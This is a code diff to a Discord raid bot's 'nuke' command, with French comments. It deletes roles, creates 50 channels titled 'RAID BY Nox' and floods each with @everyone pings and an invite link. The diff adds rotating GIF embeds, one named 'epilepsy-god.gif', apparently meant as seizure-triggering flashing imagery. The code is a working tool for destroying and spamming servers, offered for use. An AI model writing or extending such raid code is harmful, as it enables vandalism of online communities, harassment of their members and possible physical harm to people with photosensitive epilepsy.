@@ -43,13 +43,25 @@ async def nuke(ctx):
                     print(f"Erreur suppression rôle {role.name}: {str(e)}")
 
     async def create_channels_and_spam():
+        gifs = [
+            "https://cdn.discordapp.com/attachments/1363575343197327500/1363581586834198528/epilepsy-god.gif?ex=68068dd0&is=68053c50&hm=edb89319941a6ce92de22e07189fe8b1163c1d9e9d825e699bdf495ac0e3749d&",
+            "https://cdn.discordapp.com/attachments/1363575343197327500/1363581587198972207/The-Purge-Season-1-Finale-Joe-Owens-Jenna-Betancourt-Rick-Betancourt.gif?ex=68068dd0&is=68053c50&hm=82c41c1016222e6de8c535b50c44da60d33b9b09bd43426ef3398c43859eec1f&",
+            "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067522277637/images.jpg?ex=68068e43&is=68053cc3&hm=7b6f81fc88b7072a144f78c0232a45c9083f0e3674d9ef101d396d3925b0bea3&",
+            "https://cdn.discordapp.com/attachments/1363575343197327500/1363582067870535750/f4a7c1fd5f5056cbc63f948f66b187a7.gif?ex=68068e43&is=68053cc3&hm=ad6b25f2f06c3fb6746e6d1f206ee7c90d9cfe46fc1a170f1cdac701b2485684&"
+        ]
+        
         for _ in range(50):
             try:
                 channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                 print(f"Salon créé : {channel.name}")
+
+                # Choisir un GIF au hasard dans la liste
+                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone", color=discord.Color.red())
+                embed.set_image(url=gifs[_ % len(gifs)])  # Sélectionner un GIF en fonction de l'index
+                
                 for _ in range(5):
                     try:
-                        await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
+                        await channel.send(embed=embed)
                     except Exception as e:
                         print(f"Erreur envoi message : {str(e)}")
             except Exception as e:
